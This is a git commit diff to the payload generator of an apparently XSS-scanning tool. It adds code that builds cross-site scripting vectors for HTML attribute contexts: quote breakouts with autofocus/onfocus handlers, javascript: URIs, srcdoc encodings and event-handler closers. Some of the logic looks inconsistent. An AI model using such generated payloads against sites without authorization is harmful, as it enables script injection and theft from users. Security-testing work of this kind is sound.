06e9b1360d4aaad15751a39189e2817c417e5cbc
Chathuranga BW <funnyhacker902@gmail.com>
2024-09-17 01:17:47 +0400

    Update generator.py

--- core/generator.py
+++ core/generator.py
@@ -4,6 +4,16 @@ from core.utils import randomUpper as r, genGen, extractScripts
 
 
 def generator(occurences, response):
+    """
+    Generates XSS payload vectors based on the identified vulnerable contexts in the response.
+
+    Args:
+        occurences (dict): A dictionary containing vulnerability occurrences with their context and scores.
+        response (str): The HTTP response body from which scripts are extracted.
+
+    Returns:
+        dict: A dictionary of XSS vectors, categorized by their score.
+    """
     scripts = extractScripts(response)
     index = 0
     vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
@@ -11,6 +21,7 @@ def generator(occurences, response):
 
     for i in occurences:
         context = occurences[i]['context']
+
         if context == 'html':
             lessBracketEfficiency = occurences[i]['score']['<']
             greatBracketEfficiency = occurences[i]['score']['>']
@@ -30,15 +41,59 @@ def generator(occurences, response):
             quote = occurences[i]['details']['quote'] or ''
             attributeName = occurences[i]['details']['name']
             attributeValue = occurences[i]['details']['value']
-            payloads = []
+            quoteEfficiency = occurences[i]['score'].get(quote, 100)
+            greatBracketEfficiency = occurences[i]['score']['>']
+            ends = ['//']
 
-            if Type == 'name':
-                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, [quote])
-            elif Type == 'value':
-                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, [quote + attributeValue + quote])
+            # Handle efficiency cases for generating payloads
+            if greatBracketEfficiency == 100:
+                ends.append('>')
 
-            for payload in payloads:
-                vectors[9].add(f'{tag} {attributeName}={payload}')
+            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
+                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
+                for payload in payloads:
+                    payload = quote + '>' + payload
+                    found = True
+                    vectors[9].add(payload)
+
+            if quoteEfficiency == 100:
+                for filling in fillings:
+                    for function in functions:
+                        vector = quote + filling + r('autofocus') + filling + r('onfocus') + '=' + quote + function
+                        found = True
+                        vectors[8].add(vector)
+
+            if quoteEfficiency == 90:
+                for filling in fillings:
+                    for function in functions:
+                        vector = '\\' + quote + filling + r('autofocus') + filling + r('onfocus') + '=' + function + filling + '\\' + quote
+                        found = True
+                        vectors[7].add(vector)
+
+            # Handle specific attributes
+            if Type == 'value':
+                if attributeName == 'srcdoc':
+                    if occurences[i]['score']['<']:
+                        if occurences[i]['score']['>']:
+                            del ends[:]
+                            ends.append('%26gt;')
+                        payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
+                        for payload in payloads:
+                            found = True
+                            vectors[9].add(payload.replace('<', '%26lt;'))
+
+                elif attributeName == 'href' and attributeValue == xsschecker:
+                    for function in functions:
+                        found = True
+                        vectors[10].add(r('javascript:') + function)
+
+                elif attributeName.startswith('on'):
+                    closer = jsContexter(attributeValue)
+                    quote = ''
+                    for char in attributeValue.split(xsschecker)[1]:
+                        if char in ['\'', '"', '`']:
+                            quote = char
+                    vectors[11].add(attributeValue.replace(xsschecker, closer))
 
         elif context == 'script':
             payloads = jsContexter(occurences[i], scripts, index)
